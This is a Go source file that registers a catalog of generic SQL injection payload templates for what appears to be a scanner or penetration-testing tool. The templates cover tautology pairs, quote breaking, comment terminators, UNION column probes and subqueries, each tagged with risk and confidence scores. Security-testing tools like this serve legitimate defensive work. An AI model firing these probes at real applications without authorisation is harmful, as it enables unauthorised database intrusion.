package payloads

// Generic (cross-database) payload catalog. These vectors are dialect-agnostic:
// quote breaking, comment families, tautology/false pairs, arithmetic boolean
// pairs, and basic union discovery.

func genRow(id, title, tech, clause, minv, maxv string, risk, level, conf int, pre, suf, tpl string) Payload {
	return Payload{
		ID: id, Title: title, DBMS: DBGeneric, Technique: Technique(tech),
		Clause: Clause(clause), MinVersion: minv, MaxVersion: maxv,
		Risk: risk, Level: level, Confidence: conf,
		PrefixMode: pre, SuffixMode: suf, Template: tpl,
	}
}

func init() {
	rows := []Payload{
		// ---- Boolean (tautology / false / arithmetic pairs) ----
		genRow("gen-bool-and-num", "Generic AND boolean-based blind (numeric)", "boolean", "where", "", "", 1, 1, 86, "and", "comment", "{orig} AND 1=1"),
		genRow("gen-bool-and-string", "Generic AND boolean-based blind (string)", "boolean", "where", "", "", 1, 1, 86, "and", "comment", "{orig}' AND '1'='1"),
		genRow("gen-bool-and-alpha", "Generic AND boolean-based blind (alphabetic)", "boolean", "where", "", "", 1, 1, 84, "and", "comment", "{orig}' AND 'a'='a"),
		genRow("gen-bool-or-num", "Generic OR boolean-based blind (numeric)", "boolean", "where", "", "", 1, 2, 86, "or", "comment", "{orig} OR 1=1"),
		genRow("gen-bool-and-zero", "Generic AND boolean-based blind (0=0 arithmetic)", "boolean", "where", "", "", 1, 1, 86, "and", "comment", "{orig} AND 0=0"),
		genRow("gen-bool-and-2eq2", "Generic AND boolean-based blind (2=2)", "boolean", "where", "", "", 1, 1, 86, "and", "comment", "{orig} AND 2=2"),
		genRow("gen-bool-and-neg", "Generic AND boolean-based blind (-1=-1)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND -1=-1"),

		// ---- Quote breaking ----
		genRow("gen-quote-single", "Generic quote breaking - single quote", "boolean", "generic", "", "", 1, 1, 80, "value", "none", "{orig}'"),
		genRow("gen-quote-double", "Generic quote breaking - double quote", "boolean", "generic", "", "", 1, 1, 80, "value", "none", "{orig}\""),
		genRow("gen-quote-escaped", "Generic quote breaking - escaped quote pair", "boolean", "generic", "", "", 1, 2, 78, "value", "none", "{orig}''"),
		genRow("gen-quote-backslash", "Generic quote breaking - backslash escape", "boolean", "generic", "", "", 1, 2, 76, "value", "none", "{orig}\\"),
		genRow("gen-quote-paren-single", "Generic quote breaking - single quote + paren", "boolean", "generic", "", "", 1, 2, 78, "value", "none", "{orig}')"),
		genRow("gen-quote-paren-double", "Generic quote breaking - double quote + paren", "boolean", "generic", "", "", 1, 2, 78, "value", "none", "{orig}\")"),

		// ---- Comment families ----
		genRow("gen-comment-dash", "Generic comment - double dash space", "boolean", "generic", "", "", 1, 1, 84, "value", "comment", "{orig}-- -"),
		genRow("gen-comment-hash", "Generic comment - hash", "boolean", "generic", "", "", 1, 1, 82, "value", "comment", "{orig}#"),
		genRow("gen-comment-cstyle", "Generic comment - C-style block", "boolean", "generic", "", "", 1, 2, 84, "value", "comment", "{orig}/*{query}*/"),
		genRow("gen-comment-dashdash", "Generic comment - double dash without space", "boolean", "generic", "", "", 1, 2, 78, "value", "comment", "{orig}--"),

		// ---- UNION discovery ----
		genRow("gen-union-orderby", "Generic UNION query - ORDER BY column probe", "union", "where", "", "", 1, 1, 84, "replace", "comment", "{orig} ORDER BY {marker}"),
		genRow("gen-union-select-null", "Generic UNION query - UNION SELECT NULL", "union", "where", "", "", 1, 1, 88, "replace", "comment", "{orig} UNION SELECT {colcount}"),
		genRow("gen-union-all-null", "Generic UNION query - UNION ALL SELECT NULL", "union", "where", "", "", 1, 1, 88, "replace", "comment", "{orig} UNION ALL SELECT {colcount}"),

		// ---- Inline subquery ----
		genRow("gen-inline-sub", "Generic inline query - subquery as value", "inline", "where", "", "", 1, 1, 84, "value", "none", "(SELECT 1)"),

		// ---- Boolean operators on predicates ----
		genRow("gen-bool-and-paren", "Generic AND boolean-based blind (pared)", "boolean", "where", "", "", 1, 2, 84, "and", "comment", "{orig} AND (1=1)"),
		genRow("gen-bool-and-sub", "Generic AND boolean-based blind (subquery)", "boolean", "where", "", "", 1, 2, 84, "and", "comment", "{orig} AND (SELECT 1)=1"),
	}
	for _, p := range rows {
		MustRegister(p)
	}
}
